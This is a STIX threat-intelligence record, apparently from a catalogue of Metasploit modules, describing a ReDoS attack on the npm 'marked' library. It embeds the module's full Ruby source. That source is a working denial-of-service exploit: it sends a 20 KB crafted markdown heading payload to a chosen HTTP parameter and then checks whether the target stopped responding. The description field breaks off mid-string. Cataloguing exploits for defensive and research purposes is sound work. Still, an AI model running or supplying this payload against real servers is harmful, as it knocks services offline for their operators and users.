{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0b8c8d86-a4cf-42ff-9406-f1c9f9cec572",
    "created": "2024-08-14T16:26:28.450296Z",
    "modified": "2024-08-14T16:26:28.450301Z",
    "name": "marked npm module \"heading\" ReDoS",
    "description": " This module exploits a Regular Expression Denial of Service vulnerability in the npm module \"marked\". The vulnerable portion of code that this module targets is in the \"heading\" regular expression. Web applications that use \"marked\" for generating html from markdown are vulnerable. Versions up to 0.4.0 are vulnerable.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/marked_redos.rb",
            "external_id": "marked_redos.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'marked npm module \"heading\" ReDoS',\n      'Description' => %q{\n        This module exploits a Regular Expression Denial of Service vulnerability\n        in the npm module \"marked\". The vulnerable portion of code that this module\n        targets is in the \"heading\" regular expression. Web applications that use\n        \"marked\" for generating html from markdown are vulnerable. Versions up to\n        0.4.0 are vulnerable.\n      },\n      'References'  =>\n        [\n          ['URL', 'https://blog.sonatype.com/cve-2017-17461-vulnerable-or-not'],\n          ['CWE', '400']\n        ],\n      'Author'      =>\n        [\n          'Adam Cazzolla, Sonatype Security Research',\n          'Nick Starke, Sonatype Security Research'\n        ],\n      'License'     =>  MSF_LICENSE\n    ))\n\n    register_options([\n      Opt::RPORT(80),\n      OptString.new('HTTP_METHOD', [true, 'The default HTTP Verb to use', 'GET']),\n      OptString.new('HTTP_PARAMETER', [true, 'The vulnerable HTTP parameters', '']),\n      OptString.new('TARGETURI', [true, 'The URL Path to use', '/'])\n    ])\n  end\n\n  def run\n    if test_service\n      trigger_redos\n      test_service_unresponsive\n    else\n      fail_with(Failure::Unreachable, \"#{peer} - Could not communicate with service.\")\n    end\n  end\n\n  def trigger_redos\n    begin\n      print_status(\"Sending ReDoS request to #{peer}.\")\n\n      params = {\n        'uri' => normalize_uri(target_uri.path),\n        'method' => datastore['HTTP_METHOD'],\n          (\"vars_#{datastore['HTTP_METHOD'].downcase}\") => {\n            datastore['HTTP_PARAMETER'] =>  \"# #\" + (\" \" * 20 * 1024) + Rex::Text.rand_text_alpha(1)\n        }\n      }\n\n      res = send_request_cgi(params)\n\n      if res\n        fail_with(Failure::Unknown, \"ReDoS request unsuccessful. Received status #{res.code} from #{peer}.\")\n      end\n\n      print_status(\"No response received from #{peer}, service is most likely unresponsive.\")\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to #{peer}.\")\n    rescue ::Timeout::Error\n      print_status(\"No HTTP response received from #{peer}, this indicates the payload was successful.\")\n    end\n  end\n\n  def test_service_unresponsive\n    begin\n      print_status('Testing for service unresponsiveness.')\n\n      res = send_request_cgi({\n        'uri' => '/' + Rex::Text.rand_text_alpha(8),\n        'method' => 'GET'\n      })\n\n      if res.nil?\n        print_good('Service not responding.')\n      else\n        print_error('Service responded with a valid HTTP Response; ReDoS attack failed.')\n      end\n    rescue ::Rex::ConnectionRefused\n      print_error('An unknown error occurred.')\n    rescue ::Timeout::Error\n      print_good('HTTP request timed out, most likely the ReDoS attack was successful.')\n    end\n  end\n\n  def test_service\n    begin\n      print_status('Testing Service to make sure it is working.')\n\n      res = send_request_cgi({\n        'uri' => '/' + Rex::Text.rand_text_alpha(8),\n        'method' => 'GET'\n      })\n\n      if res && res.code >= 100 && res.code < 500\n        print_status(\"Test request successful, attempting to send payload. Server returned #{res.code}\")\n        return true\n      else\n        return false\n      end\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to #{peer}.\")\n      return false\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}